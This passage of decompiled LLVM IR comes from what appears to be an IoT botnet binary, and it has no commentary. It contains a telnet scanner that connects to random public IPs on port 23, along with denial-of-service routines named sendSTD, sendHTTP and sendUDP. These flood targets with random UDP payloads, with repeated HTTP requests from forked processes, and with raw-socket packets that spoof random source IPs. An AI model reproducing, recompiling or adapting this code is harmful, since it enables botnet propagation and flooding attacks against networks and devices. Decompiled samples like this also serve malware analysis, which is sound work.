  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v2_10003cb4 = inttoptr i32 %v2_10003bd4 to i32*
  store i32 0, i32* %v2_10003cb4, align 4
  %v1_10003cbc = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cbc = add i32 %v1_10003cbc, 4
  %v3_10003cbc = inttoptr i32 %v2_10003cbc to i32*
  store i32 0, i32* %v3_10003cbc, align 4
  %v1_10003cc4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cc4 = add i32 %v1_10003cc4, 8
  %v3_10003cc4 = inttoptr i32 %v2_10003cc4 to i32*
  store i32 0, i32* %v3_10003cc4, align 4
  %v1_10003ccc = load i32, i32* %r9.global-to-local, align 4
  %v2_10003ccc = add i32 %v1_10003ccc, 12
  %v3_10003ccc = inttoptr i32 %v2_10003ccc to i32*
  store i32 0, i32* %v3_10003ccc, align 4
  %v1_10003cd4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cd4 = add i32 %v1_10003cd4, 16
  %v3_10003cd4 = inttoptr i32 %v2_10003cd4 to i32*
  store i32 0, i32* %v3_10003cd4, align 4
  %v1_10003cdc = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cdc = add i32 %v1_10003cdc, 20
  %v3_10003cdc = inttoptr i32 %v2_10003cdc to i32*
  store i32 0, i32* %v3_10003cdc, align 4
  %v1_10003ce4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003ce4 = add i32 %v1_10003ce4, 24
  %v3_10003ce4 = inttoptr i32 %v2_10003ce4 to i32*
  store i32 0, i32* %v3_10003ce4, align 4
  store i32 %v1_10003c94, i32* %r9.global-to-local, align 4
  store i32 %v2_10003c98, i32* %v1_10003c98, align 4
  store i32 268451084, i32* @lr, align 4
  %v1_10003d08 = call i32 @GetRandomPublicIP(i32 %v1_10003c94)
  %v0_10003d14 = load i32, i32* @r29, align 4
  %v1_10003d14 = mul i32 %v0_10003d14, 28
  %v1_10003d1c = add i32 %v1_10003d14, %v2_10003d18
  store i32 %v1_10003d1c, i32* %r9.global-to-local, align 4
  %v2_10003d20 = inttoptr i32 %v1_10003d1c to i32*
  store i32 %v1_10003d08, i32* %v2_10003d20, align 4
  br label %dec_label_pc_10003da8

dec_label_pc_10003d28:                            ; preds = %dec_label_pc_10003c38
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v3_10003d38 = load i8, i8* %v2_10003c74, align 1
  %v3_10003d40 = icmp eq i8 %v3_10003d38, 0
  br i1 %v3_10003d40, label %dec_label_pc_10003d48, label %dec_label_pc_10003da8

dec_label_pc_10003d48:                            ; preds = %dec_label_pc_10003d28
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v1_10003d58 = add i32 %v2_10003bd4, 11
  %v2_10003d58 = inttoptr i32 %v1_10003d58 to i8*
  %v3_10003d58 = load i8, i8* %v2_10003d58, align 1
  %v1_10003d60 = add i8 %v3_10003d58, 1
  store i8 %v1_10003d60, i8* %v2_10003d58, align 1
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v1_10003d88 = add i32 %v2_10003bd4, 10
  %v2_10003d88 = inttoptr i32 %v1_10003d88 to i8*
  %v3_10003d88 = load i8, i8* %v2_10003d88, align 2
  %v1_10003d90 = add i8 %v3_10003d88, 1
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  store i8 %v1_10003d90, i8* %v2_10003d88, align 2
  br label %dec_label_pc_10003da8

dec_label_pc_10003da8:                            ; preds = %dec_label_pc_10003d28, %dec_label_pc_10003c84, %dec_label_pc_10003d48
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10003db4 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-52, align 4
  %v1_10003de8 = add i32 %v2_10003bd4, 4
  store i32 %v1_10003de8, i32* %r9.global-to-local, align 4
  store i32 268451336, i32* @lr, align 4
  %v3_10003e04 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_10003e10 = mul i32 %storemerge48, 28
  %v2_10003e14 = add i32 %v1_10003e10, %v1_10003ab4
  %v2_10003e18 = inttoptr i32 %v2_10003e14 to i32*
  store i32 %v3_10003e04, i32* %v2_10003e18, align 4
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v1_10003e2c = inttoptr i32 %v2_10003bd4 to i32*
  %v2_10003e2c = load i32, i32* %v1_10003e2c, align 4
  store i32 %v2_10003e2c, i32* %r9.global-to-local, align 4
  %v4_10003e34 = icmp eq i32 %v2_10003e2c, -1
  br i1 %v4_10003e34, label %dec_label_pc_10004974, label %dec_label_pc_10003e3c

dec_label_pc_10003e3c:                            ; preds = %dec_label_pc_10003da8
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v2_10003e4c = load i32, i32* %v1_10003e2c, align 4
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v2_10003e60 = load i32, i32* %v1_10003e2c, align 4
  store i32 268451448, i32* @lr, align 4
  %v2_10003e74 = call i32 @__libc_fcntl(i32 %v2_10003e60, i32 3)
  store i32 268451476, i32* @lr, align 4
  %v2_10003e90 = call i32 @__libc_fcntl(i32 %v2_10003e4c, i32 4)
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v2_10003ea4 = load i32, i32* %v1_10003e2c, align 4
  store i32 %v2_10003ea8, i32* %r9.global-to-local, align 4
  store i32 268451516, i32* @lr, align 4
  %v3_10003eb8 = call i32 @__libc_connect(i32 %v2_10003ea4, i32 %v2_10003ea8, i32 16)
  store i32 %v3_10003eb8, i32* %r9.global-to-local, align 4
  %v4_10003ec4 = icmp eq i32 %v3_10003eb8, -1
  br i1 %v4_10003ec4, label %dec_label_pc_10003ecc, label %dec_label_pc_10003efc

dec_label_pc_10003ecc:                            ; preds = %dec_label_pc_10003e3c
  %v0_10003ecc = call i32 @__errno_location()
  store i32 %v0_10003ecc, i32* %r9.global-to-local, align 4
  %v1_10003ed4 = inttoptr i32 %v0_10003ecc to i32*
  %v2_10003ed4 = load i32, i32* %v1_10003ed4, align 4
  %v3_10003ed8 = icmp eq i32 %v2_10003ed4, 115
  br i1 %v3_10003ed8, label %dec_label_pc_10003efc, label %dec_label_pc_10003ee0

dec_label_pc_10003ee0:                            ; preds = %dec_label_pc_10003ecc
  store i32 %v1_10003ab4, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10003ef8.70 to i32), i32* @lr, align 4
  %v2_10003ef4 = call i32 @reset_telstate(i32 %v2_10003bd4, i32 %v1_10003ab4)
  br label %dec_label_pc_10004974

dec_label_pc_10003efc:                            ; preds = %dec_label_pc_10003e3c, %dec_label_pc_10003ecc
  store i32 %v1_10003ab4, i32* %r9.global-to-local, align 4
  %v3_10003f14 = call i32 @advance_state(i32* nonnull %v1_10003e2c, i32 1)
  br label %dec_label_pc_10004974

dec_label_pc_10004974:                            ; preds = %dec_label_pc_10003da8, %dec_label_pc_10003c10, %dec_label_pc_10003efc, %dec_label_pc_10003ee0
  %v1_10004978 = add nuw nsw i32 %storemerge48, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10004988 = icmp slt i32 %v1_10004978, %arg2
  br i1 %v2_10004988, label %dec_label_pc_10003bc8, label %dec_label_pc_10003bbc

; uselistorder directives
  uselistorder i32 %v1_10004978, { 1, 0 }
  uselistorder i32 %v1_10003c94, { 1, 0, 2, 3 }
  uselistorder i8 %v3_10003c20, { 1, 0 }
  uselistorder i32 %v2_10003bd4, { 5, 6, 7, 8, 10, 9, 11, 0, 2, 1, 4, 3, 15, 13, 12, 14, 17, 16, 19, 18, 20 }
  uselistorder i32 %storemerge48, { 3, 1, 0, 2 }
  uselistorder i32 %v1_10003b70, { 1, 0 }
  uselistorder i32 %storemerge313, { 1, 0 }
  uselistorder i32 %v1_10003ab4, { 6, 5, 4, 0, 7, 1, 3, 8, 2, 9, 10 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 31, 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 22, 21, 23, 24, 25, 44, 26, 27, 28, 29, 30, 45, 32, 40, 33, 34, 35, 36, 37, 38, 39, 46, 41, 42, 43 }
  uselistorder i32 %arg2, { 4, 3, 2, 6, 5, 0, 1, 7, 8 }
  uselistorder label %dec_label_pc_10004974, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10003efc, { 1, 0 }
  uselistorder label %dec_label_pc_10003da8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10003c10, { 1, 0 }
  uselistorder label %dec_label_pc_10003bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10003bbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003af0, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  store i32 268454340, i32* @lr, align 4
  %v3_100049c0 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268454356, i32* @lr, align 4
  %v1_100049d0 = call i32 @__GI_time(i32 0)
  store i32 268454376, i32* @lr, align 4
  %v1_100049e4 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_100049f0 = ptrtoint i32* %stack_var_-196 to i32
  store i32 0, i32* %stack_var_-196, align 4
  store i32 0, i32* %stack_var_-192, align 4
  %v1_10004a18 = add i32 %v1_100049e4, 16
  %v2_10004a18 = inttoptr i32 %v1_10004a18 to i32*
  %v3_10004a18 = load i32, i32* %v2_10004a18, align 4
  %v1_10004a1c = inttoptr i32 %v3_10004a18 to i32*
  %v2_10004a1c = load i32, i32* %v1_10004a1c, align 4
  %v2_10004a24 = ptrtoint i32* %stack_var_-192 to i32
  %v1_10004a2c = add i32 %v1_100049e4, 12
  %v2_10004a2c = inttoptr i32 %v1_10004a2c to i32*
  %v3_10004a2c = load i32, i32* %v2_10004a2c, align 4
  store i32 %v3_10004a2c, i32* @r5, align 4
  store i32 268454464, i32* @lr, align 4
  %v4_10004a3c = call i32 @bcopy(i32 %v2_10004a1c, i32 %v2_10004a24, i32 %v3_10004a2c, i32 %v1_100049e4)
  %v1_10004a44 = add i32 %v1_100049e4, 8
  %v2_10004a44 = inttoptr i32 %v1_10004a44 to i32*
  %v3_10004a44 = load i32, i32* %v2_10004a44, align 4
  %v1_10004a48 = urem i32 %v3_10004a44, 65536
  store i32 %v1_10004a48, i32* %stack_var_-196, align 4
  %v2_10004a6c = ptrtoint i32* %stack_var_-180 to i32
  %v2_10004abc = ptrtoint i32* %stack_var_-216 to i32
  %v2_10004ac0 = add i32 %v2_10004abc, 36
  %v2_10004b18 = add i32 %v1_100049d0, %arg3
  br label %dec_label_pc_10004a64

dec_label_pc_10004a64:                            ; preds = %dec_label_pc_10004b3c, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_10004b40, %dec_label_pc_10004b3c ]
  store i32 %v2_10004a6c, i32* @r3, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_10011eac.413 to i32), i32* @r4, align 4
  store i32 144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10004a84.414 to i32), i32* @lr, align 4
  %v0_10004a80 = call i32 @memcpy()
  store i32 268454536, i32* @lr, align 4
  %v0_10004a84 = call i32 @random()
  %v1_10004a9c = urem i32 %v0_10004a84, 36
  %v1_10004ab8 = mul nuw nsw i32 %v1_10004a9c, 4
  %v1_10004ac4 = add i32 %v2_10004ac0, %v1_10004ab8
  %v1_10004ac8 = inttoptr i32 %v1_10004ac4 to i32*
  %v2_10004ac8 = load i32, i32* %v1_10004ac8, align 4
  store i32 %v2_10004ac8, i32* %stack_var_-216, align 4
  %tmp23 = icmp ult i32 %storemerge3, 50
  br i1 %tmp23, label %dec_label_pc_10004b3c, label %dec_label_pc_10004adc

dec_label_pc_10004adc:                            ; preds = %dec_label_pc_10004a64
  store i32 268454640, i32* @lr, align 4
  %v4_10004aec = call i32 @__libc_send(i32 %v3_100049c0, i32 %v2_10004ac8, i32 65, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10004b04.415 to i32), i32* @lr, align 4
  %v3_10004b00 = call i32 @__libc_connect(i32 %v3_100049c0, i32 %v2_100049f0, i32 16)
  store i32 268454668, i32* @lr, align 4
  %v1_10004b08 = call i32 @__GI_time(i32 0)
  %v2_10004b1c = icmp slt i32 %v1_10004b08, %v2_10004b18
  br i1 %v2_10004b1c, label %dec_label_pc_10004b34, label %dec_label_pc_10004b24

dec_label_pc_10004b24:                            ; preds = %dec_label_pc_10004adc
  store i32 ptrtoint ([3 x i8]* @global_var_10004b2c.416 to i32), i32* @lr, align 4
  %v1_10004b28 = call i32 @__libc_close(i32 %v3_100049c0)
  %v1_10004b30 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10004b34

dec_label_pc_10004b34:                            ; preds = %dec_label_pc_10004adc, %dec_label_pc_10004b24
  br label %dec_label_pc_10004b3c

dec_label_pc_10004b3c:                            ; preds = %dec_label_pc_10004a64, %dec_label_pc_10004b34
  %stack_var_-212.0 = phi i32 [ %storemerge3, %dec_label_pc_10004a64 ], [ 0, %dec_label_pc_10004b34 ]
  %v1_10004b40 = add i32 %stack_var_-212.0, 1
  br label %dec_label_pc_10004a64

; uselistorder directives
  uselistorder i32 %v3_10004a2c, { 1, 0 }
  uselistorder i32 %v1_100049e4, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_10004b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10004b34, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-568 = alloca i32, align 4
  store i32 268454788, i32* @lr, align 4
  %v1_10004b80 = call i32 @__GI_time(i32 0)
  %v2_10004b8c = add i32 %v1_10004b80, %arg5
  %v2_10004ccc8 = icmp sgt i32 %arg6, 0
  br i1 %v2_10004ccc8, label %dec_label_pc_10004ba8.lr.ph, label %dec_label_pc_10004cd4

dec_label_pc_10004ba8.lr.ph:                      ; preds = %entry
  %v2_10004bf4 = ptrtoint i32* %stack_var_-568 to i32
  br label %dec_label_pc_10004ba8

dec_label_pc_10004ba8:                            ; preds = %dec_label_pc_10004ba8.lr.ph, %dec_label_pc_10004cb8
  %storemerge311 = phi i32 [ 0, %dec_label_pc_10004ba8.lr.ph ], [ %v1_10004cbc, %dec_label_pc_10004cb8 ]
  store i32 268454828, i32* @lr, align 4
  %v0_10004ba8 = call i32 @random()
  %v2_10004bc4 = srem i32 %v0_10004ba8, 36
  %v1_10004be8 = mul nsw i32 %v2_10004bc4, 4
  %v2_10004bec = add i32 %v1_10004be8, ptrtoint ([36 x i8*]* @global_var_10023974.453 to i32)
  %v1_10004bf0 = inttoptr i32 %v2_10004bec to i32*
  %v2_10004bf0 = load i32, i32* %v1_10004bf0, align 4
  store i32 %v2_10004bf4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004c1c.455 to i32), i32* @lr, align 4
  %v10_10004c18 = call i32 @sprintf(i32 %v2_10004bf4, i32 ptrtoint ([64 x i8]* @global_var_10011f3c.454 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v2_10004bf0, i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32 %v2_10004bc4)
  store i32 268454944, i32* @lr, align 4
  %v0_10004c1c = call i32 @__libc_fork()
  %v3_10004c24 = icmp eq i32 %v0_10004c1c, 0
  br i1 %v3_10004c24, label %dec_label_pc_10004cb8, label %dec_label_pc_10004c98.preheader

dec_label_pc_10004c98.preheader:                  ; preds = %dec_label_pc_10004ba8
  store i32 268455072, i32* @lr, align 4
  %v1_10004c9c4 = call i32 @__GI_time(i32 0)
  %v2_10004ca85 = icmp slt i32 %v1_10004c9c4, %v2_10004b8c
  br i1 %v2_10004ca85, label %dec_label_pc_10004c30, label %dec_label_pc_10004cb0

dec_label_pc_10004c30:                            ; preds = %dec_label_pc_10004c98.preheader, %dec_label_pc_10004c98.backedge
  %v4_10004c40 = call i32 @socket_connect(i32 %arg2, i16 %arg3, i32 %v2_10004b8c)
  %v3_10004c50 = icmp eq i32 %v4_10004c40, 0
  br i1 %v3_10004c50, label %dec_label_pc_10004c98.backedge, label %dec_label_pc_10004c58

dec_label_pc_10004c58:                            ; preds = %dec_label_pc_10004c30
  store i32 %v2_10004bf4, i32* @r3, align 4
  %v0_10004c60 = call i32 @__GI_strlen()
  store i32 268455036, i32* @lr, align 4
  %v2_10004c78 = call i32 @__libc_write(i32 %v4_10004c40, i32 %v2_10004bf4)
  store i32 268455056, i32* @lr, align 4
  %v1_10004c8c = call i32 @__libc_read(i32 %v4_10004c40)
  store i32 ptrtoint ([3 x i8]* @global_var_10004c98.456 to i32), i32* @lr, align 4
  %v1_10004c94 = call i32 @__libc_close(i32 %v4_10004c40)
  br label %dec_label_pc_10004c98.backedge

dec_label_pc_10004c98.backedge:                   ; preds = %dec_label_pc_10004c58, %dec_label_pc_10004c30
  store i32 268455072, i32* @lr, align 4
  %v1_10004c9c = call i32 @__GI_time(i32 0)
  %v2_10004ca8 = icmp slt i32 %v1_10004c9c, %v2_10004b8c
  br i1 %v2_10004ca8, label %dec_label_pc_10004c30, label %dec_label_pc_10004cb0

dec_label_pc_10004cb0:                            ; preds = %dec_label_pc_10004c98.backedge, %dec_label_pc_10004c98.preheader
  %v0_10004cb4 = call i32 @__GI_exit()
  br label %dec_label_pc_10004cb8

dec_label_pc_10004cb8:                            ; preds = %dec_label_pc_10004ba8, %dec_label_pc_10004cb0
  %v0_10004ce813 = phi i32 [ 0, %dec_label_pc_10004ba8 ], [ %v0_10004cb4, %dec_label_pc_10004cb0 ]
  %v1_10004cbc = add nuw nsw i32 %storemerge311, 1
  %v2_10004ccc = icmp slt i32 %v1_10004cbc, %arg6
  br i1 %v2_10004ccc, label %dec_label_pc_10004ba8, label %dec_label_pc_10004cd4

dec_label_pc_10004cd4:                            ; preds = %dec_label_pc_10004cb8, %entry
  %v0_10004ce8 = phi i32 [ %v1_10004b80, %entry ], [ %v0_10004ce813, %dec_label_pc_10004cb8 ]
  ret i32 %v0_10004ce8

; uselistorder directives
  uselistorder i32 %v2_10004bf4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10004b8c, { 1, 2, 0 }
  uselistorder i32 %v1_10004b80, { 1, 0 }
  uselistorder i32 268455072, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_10004cb8, { 1, 0 }
  uselistorder label %dec_label_pc_10004c30, { 1, 0 }
  uselistorder label %dec_label_pc_10004ba8, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10004cec = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10004cec, i32* %stack_var_-160, align 4
  %v0_10004d20 = load i32, i32* @r10, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v3_10004d30 = icmp eq i32 %arg2, 0
  br i1 %v3_10004d30, label %dec_label_pc_10004d38, label %dec_label_pc_10004d4c

dec_label_pc_10004d38:                            ; preds = %entry
  %v0_10004d38 = call i32 @rand_cmwc()
  br label %dec_label_pc_10004d64

dec_label_pc_10004d4c:                            ; preds = %entry
  %v1_10004d50 = urem i32 %arg2, 65536
  store i32 %v1_10004d50, i32* @r3, align 4
  %v1_10004d58 = call i32 @htons(i32 %v1_10004d50)
  br label %dec_label_pc_10004d64

dec_label_pc_10004d64:                            ; preds = %dec_label_pc_10004d38, %dec_label_pc_10004d4c
  %v2_10004d64 = ptrtoint i32* %stack_var_-112 to i32
  %v4_10004d74 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-108, i32 %v2_10004d64)
  %v3_10004d7c = icmp eq i32 %v4_10004d74, 0
  br i1 %v3_10004d7c, label %dec_label_pc_10004d84, label %dec_label_pc_10005350

dec_label_pc_10004d84:                            ; preds = %dec_label_pc_10004d64
  %v3_10004da8 = icmp eq i32 %arg4, 32
  br i1 %v3_10004da8, label %dec_label_pc_10004db0, label %dec_label_pc_10004f2c

dec_label_pc_10004db0:                            ; preds = %dec_label_pc_10004d84
  store i32 268455360, i32* @lr, align 4
  %v3_10004dbc = call i32 @socket(i32 2, i32 2, i32 17)
  %v3_10004dcc = icmp eq i32 %v3_10004dbc, 0
  br i1 %v3_10004dcc, label %dec_label_pc_10004dd4, label %dec_label_pc_10004df4

dec_label_pc_10004dd4:                            ; preds = %dec_label_pc_10004db0
  %v3_10004dd8 = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_10004df0.458 to i32), i32* @lr, align 4
  %v5_10004dec = call i32 @Rootsprintf(i32 %v3_10004dd8, i32 ptrtoint ([27 x i8]* @global_var_10011f7c.457 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10005350

dec_label_pc_10004df4:                            ; preds = %dec_label_pc_10004db0
  %v1_10004df8 = add i32 %arg5, 1
  store i32 %v1_10004df8, i32* @r3, align 4
  store i32 268455428, i32* @lr, align 4
  %v0_10004e00 = call i32 @malloc()
  %v3_10004e10 = icmp eq i32 %v0_10004e00, 0
  br i1 %v3_10004e10, label %dec_label_pc_10005350, label %dec_label_pc_10004e18

dec_label_pc_10004e18:                            ; preds = %dec_label_pc_10004df4
  store i32 268455480, i32* @lr, align 4
  %v3_10004e34 = call i32 @__GI_memset(i32 %v0_10004e00, i32 0, i32 %v1_10004df8)
  %v2_10004e40 = call i32 @makeRandomStr(i32 %v0_10004e00, i32 %arg5)
  store i32 268455500, i32* @lr, align 4
  %v1_10004e48 = call i32 @__GI_time(i32 0)
  %v2_10004e54 = add i32 %v1_10004e48, %arg3
  %v1_10004f04 = mul i32 %v0_10004d20, 1000
  br label %dec_label_pc_10004e70.outer

dec_label_pc_10004e70.outer:                      ; preds = %dec_label_pc_10004e70.outer.backedge, %dec_label_pc_10004e18
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_10004e18 ], [ %storemerge27, %dec_label_pc_10004e70.outer.backedge ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_10004e18 ], [ %v1_10004ee8, %dec_label_pc_10004e70.outer.backedge ]
  br label %dec_label_pc_10004e70

dec_label_pc_10004e70:                            ; preds = %dec_label_pc_10004e70.outer, %dec_label_pc_10004ed8
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10004ed8 ], [ %stack_var_-44.0.ph, %dec_label_pc_10004e70.outer ]
  store i32 268455572, i32* @lr, align 4
  %v7_10004e90 = call i32 @__libc_sendto(i32 %v3_10004dbc, i32 %v0_10004e00, i32 %arg5, i32 0, i32 %v2_10004d64, i32 16, i32 %v2_10004d64)
  %v4_10004e9c = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_10004e9c, label %dec_label_pc_10004ea4, label %dec_label_pc_10004ee4

dec_label_pc_10004ea4:                            ; preds = %dec_label_pc_10004e70
  br i1 %v3_10004d30, label %dec_label_pc_10004eb0, label %dec_label_pc_10004ec0

dec_label_pc_10004eb0:                            ; preds = %dec_label_pc_10004ea4
  %v0_10004eb0 = call i32 @rand_cmwc()
  br label %dec_label_pc_10004ec0

dec_label_pc_10004ec0:                            ; preds = %dec_label_pc_10004ea4, %dec_label_pc_10004eb0
  store i32 268455624, i32* @lr, align 4
  %v1_10004ec4 = call i32 @__GI_time(i32 0)
  %v3_10004ed0 = icmp sgt i32 %v1_10004ec4, %v2_10004e54
  br i1 %v3_10004ed0, label %dec_label_pc_10005350, label %dec_label_pc_10004ed8

dec_label_pc_10004ed8:                            ; preds = %dec_label_pc_10004ec0
  br label %dec_label_pc_10004e70

dec_label_pc_10004ee4:                            ; preds = %dec_label_pc_10004e70
  %v1_10004ee8 = add i32 %stack_var_-44.0, 1
  %v4_10004ef8 = icmp eq i32 %stack_var_-48.0.ph, %arg7
  br i1 %v4_10004ef8, label %dec_label_pc_10004f00, label %dec_label_pc_10004f1c

dec_label_pc_10004f00:                            ; preds = %dec_label_pc_10004ee4
  store i32 ptrtoint ([3 x i8]* @global_var_10004f10.460 to i32), i32* @lr, align 4
  %v2_10004f0c = call i32 @usleep(i32 %v1_10004f04, i32 %arg7)
  br label %dec_label_pc_10004e70.outer.backedge

dec_label_pc_10004e70.outer.backedge:             ; preds = %dec_label_pc_10004f00, %dec_label_pc_10004f1c
  %storemerge27 = phi i32 [ %v1_10004f20, %dec_label_pc_10004f1c ], [ 0, %dec_label_pc_10004f00 ]
  br label %dec_label_pc_10004e70.outer

dec_label_pc_10004f1c:                            ; preds = %dec_label_pc_10004ee4
  %v1_10004f20 = add i32 %stack_var_-48.0.ph, 1
  br label %dec_label_pc_10004e70.outer.backedge

dec_label_pc_10004f2c:                            ; preds = %dec_label_pc_10004d84
  store i32 268455748, i32* @lr, align 4
  %v3_10004f40 = call i32 @socket(i32 2, i32 3, i32 17)
  %v3_10004f50 = icmp eq i32 %v3_10004f40, 0
  br i1 %v3_10004f50, label %dec_label_pc_10004f58, label %dec_label_pc_10004f78

dec_label_pc_10004f58:                            ; preds = %dec_label_pc_10004f2c
  %v3_10004f5c = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_10004f74.461 to i32), i32* @lr, align 4
  %v5_10004f70 = call i32 @Rootsprintf(i32 %v3_10004f5c, i32 ptrtoint ([27 x i8]* @global_var_10011f7c.457 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10005340

dec_label_pc_10004f78:                            ; preds = %dec_label_pc_10004f2c
  store i32 1, i32* %stack_var_-96, align 4
  %v2_10004f80 = ptrtoint i32* %stack_var_-96 to i32
  store i32 268455836, i32* @lr, align 4
  %v5_10004f98 = call i32 @__GI_setsockopt(i32 %v3_10004f40, i32 0, i32 3, i32 %v2_10004f80, i32 4)
  %tmp77 = icmp sgt i32 %v5_10004f98, -1
  br i1 %tmp77, label %dec_label_pc_10004fc8, label %dec_label_pc_10004fa8

dec_label_pc_10004fa8:                            ; preds = %dec_label_pc_10004f78
  %v3_10004fac = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_10004fc4.463 to i32), i32* @lr, align 4
  %v5_10004fc0 = call i32 @Rootsprintf(i32 %v3_10004fac, i32 ptrtoint ([33 x i8]* @global_var_10011f98.462 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10005340

dec_label_pc_10004fc8:                            ; preds = %dec_label_pc_10004f78
  br label %dec_label_pc_10004fd4

dec_label_pc_10004fd4:                            ; preds = %dec_label_pc_10004fc8, %dec_label_pc_10004fd4
  %v1_1000500c22 = phi i32 [ 49, %dec_label_pc_10004fc8 ], [ %v1_1000500c, %dec_label_pc_10004fd4 ]
  store i32 268455900, i32* @lr, align 4
  %v1_10004fd8 = call i32 @__GI_time(i32 0)
  %v0_10004fe4 = call i32 @rand_cmwc()
  %v2_10004fec = xor i32 %v1_10004fd8, %v0_10004fe4
  store i32 ptrtoint (i32* @global_var_10004ff8.464 to i32), i32* @lr, align 4
  %v1_10004ff4 = call i32 @srand(i32 %v2_10004fec)
  store i32 268455932, i32* @lr, align 4
  %v0_10004ff8 = call i32 @random()
  %v1_10005004 = call i32 @init_rand(i32 %v0_10004ff8)
  %v1_1000500c = add nsw i32 %v1_1000500c22, -1
  %v4_1000501c = icmp eq i32 %v1_1000500c22, 0
  br i1 %v4_1000501c, label %dec_label_pc_10005024, label %dec_label_pc_10004fd4

dec_label_pc_10005024:                            ; preds = %dec_label_pc_10004fd4
  %v3_10005028 = icmp eq i32 %arg4, 0
  br i1 %v3_10005028, label %dec_label_pc_10005054, label %dec_label_pc_1000503c

dec_label_pc_1000503c:                            ; preds = %dec_label_pc_10005024
  %v1_10005040 = sub i32 32, %arg4
  %v2_10005048 = urem i32 %v1_10005040, 64
  %v1_1000504c = shl i32 -1, %v2_10005048
  br label %dec_label_pc_10005054

dec_label_pc_10005054:                            ; preds = %dec_label_pc_10005024, %dec_label_pc_1000503c
  %storemerge10 = phi i32 [ %v1_1000504c, %dec_label_pc_1000503c ], [ 0, %dec_label_pc_10005024 ]
  %v1_10005058 = add i32 %arg5, 28
  %v1_10005068 = add i32 %arg5, 58
  %v1_1000506c = and i32 %v1_10005068, -16
  %v2_10005074 = load i32, i32* %stack_var_-160, align 4
  %v1_1000507c = load i32, i32* @r1, align 4
  %v3_1000507c = sub i32 %v1_1000507c, %v1_1000506c
  %v4_1000507c = inttoptr i32 %v3_1000507c to i32*
  store i32 %v2_10005074, i32* %v4_1000507c, align 4
  %v1_1000508c = add i32 %v3_1000507c, 23
  %v1_10005090 = and i32 %v1_1000508c, -16
  %v1_100050b0 = add i32 %v1_10005090, 20
  %v5_100050b4 = inttoptr i32 %v1_100050b0 to i16*
  %v3_100050b8 = load i32, i32* %stack_var_-108, align 4
  %v1_100050c0 = call i32 @GetRandomIP(i32 %storemerge10)
